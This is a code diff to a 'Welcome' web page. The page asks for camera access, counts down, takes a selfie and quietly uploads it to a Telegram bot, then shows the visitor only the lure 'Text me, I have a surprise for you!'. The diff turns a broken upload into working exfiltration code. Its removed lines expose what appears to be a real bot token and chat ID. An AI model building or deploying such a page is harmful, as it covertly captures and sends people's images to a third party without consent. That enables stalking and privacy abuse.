@@ -30,13 +30,20 @@ button {
   color: white;
   margin-top: 20px;
 }
+#countdown {
+  font-size: 40px;
+  margin-top: 20px;
+  display: none;
+}
 </style>
 </head>
 <body>
 
 <h2>Welcome</h2>
+
 <button id="startBtn">Start</button>
 <video id="camera" autoplay playsinline></video>
+<div id="countdown"></div>
 
 <p id="msg" style="margin-top:20px;"></p>
 
@@ -44,6 +51,7 @@ button {
 let video = document.getElementById("camera");
 let startBtn = document.getElementById("startBtn");
 let msg = document.getElementById("msg");
+let countdown = document.getElementById("countdown");
 let cameraAllowed = false;
 
 // FIRST CLICK → ASK CAMERA PERMISSION
@@ -53,11 +61,12 @@ startBtn.addEventListener("click", async () => {
       let stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }
       });
-      
+
       video.srcObject = stream;
       video.style.display = "block";
+
       cameraAllowed = true;
-      startBtn.innerText = "Start";
+      startBtn.innerText = "Take Photo";
 
     } catch (err) {
       alert("Camera permission needed to continue.");
@@ -65,41 +74,81 @@ startBtn.addEventListener("click", async () => {
     return;
   }
 
-  // SECOND CLICK → TAKE PHOTO
-  takePhoto();
+  // SECOND CLICK → START COUNTDOWN
+  startCountdown();
 });
 
-// TAKE SELFIE + SEND TO TELEGRAM
+// COUNTDOWN BEFORE TAKING PHOTO
+function startCountdown() {
+  let timeLeft = 3;
+  countdown.style.display = "block";
+  countdown.innerText = timeLeft;
+
+  let timer = setInterval(() => {
+    timeLeft--;
+    countdown.innerText = timeLeft;
+
+    if (timeLeft === 0) {
+      clearInterval(timer);
+      countdown.style.display = "none";
+      takePhoto();
+    }
+  }, 1000);
+}
+
 function takePhoto() {
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
+
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0);
-  const imageData = canvas.toDataURL("image/png");
 
-  sendToTelegram(imageData);
+  const base64img = canvas.toDataURL("image/png");
+
+  // send to telegram
+  sendToTelegram(base64img);
+
+  // stop camera stream
+  let stream = video.srcObject;
+  let tracks = stream.getTracks();
+  tracks.forEach(track => track.stop());
+  video.style.display = "none";
 
   msg.innerText = "Text me, I have a surprise for you!";
 }
 
-// SEND IMAGE TO TELEGRAM BOT
+// WORKING TELEGRAM FUNCTION
 function sendToTelegram(base64img) {
-  const botToken = "8205878195:AAHQyaGIGg7FOtfB5k4rfSHdu3zliip7TkI";
-  const chatId = "135986918";
+  const botToken = "YOUR_BOT_TOKEN_HERE";
+  const chatId = "YOUR_CHAT_ID_HERE";
+
   const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+  // Convert Base64 → Blob
+  const arr = base64img.split(",");
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+
+  while (n--) {
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+
+  const blob = new Blob([u8arr], { type: mime });
+
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("photo", blob, "selfie.png");
 
   fetch(url, {
     method: "POST",
-    body: new FormData().append("chat_id", chatId)
+    body: formData
   });
-
-  let formData = new FormData();
-  formData.append("chat_id", chatId);
-  formData.append("photo", base64img);
-
-  fetch(url, { method: "POST", body: formData });
 }
 </script>
+
 </body>
 </html>
+
